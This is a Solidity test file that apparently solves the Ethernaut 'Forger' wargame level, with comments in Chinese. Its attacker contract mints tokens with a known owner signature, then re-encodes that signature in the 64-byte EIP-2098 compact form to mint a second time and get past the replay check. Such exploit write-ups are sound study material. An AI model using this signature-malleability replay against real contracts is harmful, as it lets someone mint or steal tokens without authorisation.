// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Forger} from "../../src/ethernaut/39_Forger/Forger.sol";

import { ECDSA } from "openzeppelin-contracts-v4.6.0/utils/cryptography/ECDSA.sol";

contract Forger_Attacker {
	address player;
	Forger coreInst;
	
	constructor(Forger coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 使用`原始65字节签名值`，进行铸造
		address owner = 0xC9CAF9e17BBb4e4D27810d97d2C2a467A701e0D5;
		bytes memory signature_65Bytes = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
		uint256 amount = 100 ether;
		address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
		bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
		uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
		coreInst.createNewTokensFromOwnerSignature(signature_65Bytes, receiver, amount, salt, deadline);
		
		// 将`65字节签名值`转换为`64字节签名值`(即，EIP-2098紧凑格式)
		(bytes32 r, bytes32 s, uint8 v) = splitSignature(signature_65Bytes);
		bytes memory signature_64Bytes = toSignature64Bytes(r, s, v);
		console.logBytes(signature_64Bytes);
		
		// 准备验证`64字节签名值`也能恢复出相同的地址
		bytes32 messageHash = keccak256(abi.encode(
			receiver,
			amount,
			salt,
			deadline
		));
		address signerCompact = ECDSA.recover(messageHash, signature_64Bytes);
		console.log("signerCompact", signerCompact);
		console.log("owner", owner);
		assert(signerCompact == owner);
		
		// 使用`原始64字节签名值`，进行铸造
		coreInst.createNewTokensFromOwnerSignature(
			signature_64Bytes,
			receiver,
			amount,
			salt,
			deadline
		);
	}

	// 辅助函数：将`65字节签名值`拆分为r, s, v
	function splitSignature(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
		require(sig.length == 65, "Invalid signature length");
		
		assembly {
			r := mload(add(sig, 32))
			s := mload(add(sig, 64))
			v := byte(0, mload(add(sig, 96)))
		}
		
		// 如果v是0或1，需要加上27
		if (v < 27) {
			v += 27;
		}
	}
	
	// 辅助函数：转换为EIP-2098紧凑格式，即，64字节签名值
	function toSignature64Bytes(bytes32 r, bytes32 s, uint8 v) internal pure returns (bytes memory) {
		// EIP-2098: vs = s + (v == 28 ? 1 << 255 : 0)
		bytes32 vs;
		if (v == 28) {
			// 设置最高位为1
			vs = bytes32(uint256(s) | (1 << 255));
		} else {
			vs = s;
		}
		
		// 紧凑格式：r || vs (64字节)
		return abi.encodePacked(r, vs);
	}
}
